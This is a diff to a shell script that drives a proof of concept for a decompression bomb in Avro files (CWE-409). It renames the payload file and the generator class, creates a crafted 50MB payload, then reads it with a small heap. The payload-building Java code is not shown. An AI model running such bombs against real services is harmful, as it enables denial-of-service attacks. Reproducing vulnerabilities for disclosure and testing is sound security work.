@@ -10,7 +10,7 @@ set -e
 
 SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
 JAR="$SCRIPT_DIR/target/avro-decompression-bomb-poc-1.0-SNAPSHOT.jar"
-POC_FILE="$SCRIPT_DIR/poc.avro"
+POC_FILE="$SCRIPT_DIR/crafted-bomb.avro"
 
 echo "============================================="
 echo " Avro Decompression Bomb PoC (CWE-409)"
@@ -25,10 +25,10 @@ if [ ! -f "$JAR" ]; then
     echo
 fi
 
-# Step 1: Create the malicious Avro file (needs large heap to write the 50MB payload)
-echo "[*] Step 1: Creating malicious Avro file..."
+# Step 1: Create the crafted malicious Avro file (needs large heap to write the 50MB payload)
+echo "[*] Step 1: Creating crafted malicious Avro file..."
 echo
-java -Xmx256m -cp "$JAR" poc.CreatePoC "$POC_FILE"
+java -Xmx256m -cp "$JAR" poc.CraftBomb "$POC_FILE"
 echo
 
 # Step 2: Attempt to read it with a small heap (32MB)
